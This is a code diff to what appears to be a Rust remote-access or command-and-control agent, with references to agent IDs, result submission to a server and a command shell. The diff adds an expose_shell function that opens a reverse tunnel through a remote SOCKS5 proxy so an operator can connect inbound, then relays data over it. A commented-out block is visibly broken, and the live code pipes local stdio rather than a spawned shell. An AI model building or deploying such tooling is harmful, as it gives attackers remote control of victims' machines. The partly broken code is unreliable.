@@ -8,6 +8,8 @@ use os_info;
 use std::net::UdpSocket;
 use crate::networking::socks5::Socks5Client;
 use std::time::Duration;
+use crate::networking::socks5::socks5_bind;
+
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -211,6 +213,52 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
         Ok(_) => Ok(()),
         Err(e) => Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
     }
+}
+
+async fn expose_shell(port: u16, proxy_addr: &str, proxy_port: u16) -> io::Result<()> {
+    /*
+    // 1) request a BIND on the remote proxy
+    let mut inbound = socks5_bind(proxy_addr, proxy_port, port).await?;
+    println!("[SOCKS5] BIND established on {}:{}", proxy_addr, proxy_port);
+
+    // 2) tokio_socks will do the two‑reply for you; once it returns
+    //    you get a future that resolves when *your* listener gets an incoming
+    //    connect from the server operator.
+    let (mut inbound, _) = bind_stream.into_inner();
+    // 3) now inbound is your 2‑way channel from the server → agent shell
+    tokio::io::copy_bidirectional(&mut inbound, &mut inbound).await?;
+    Ok(())
+    */
+
+    let mut stream = socks5_bind(proxy_addr, proxy_port, port).await?;
+    println!("[SOCKS5] Reverse tunnel established via {}:{}", proxy_addr, proxy_port);
+
+    
+    // splitting tunnel into read/write halves
+    let (mut reader, mut writer) = tokio::io::split(stream);
+    let mut stdin = tokio::io::stdin();
+    let mut stdout = tokio::io::stdout();
+
+    // pump local stdin -> remote, and remote -> local stdout
+    let to_remote = tokio::spawn(async move {
+        tokio::io::copy(&mut stdin, &mut writer).await
+    });
+
+    let to_local = tokio::spawn(async move {
+        tokio::io::copy(&mut reader, &mut stdout).await
+    });
+
+    // wait until the either side closes
+    tokio::select! {
+        _ = to_remote => {
+            println!("[SOCKS5] Local stdin closed");
+        }
+        _ = to_local => {
+            println!("[SOCKS5] Remote stream closed");
+        }
+    }
+
+    Ok(())
 }
 
 // This is a simple command shell that allows for basic file operations and command execution.
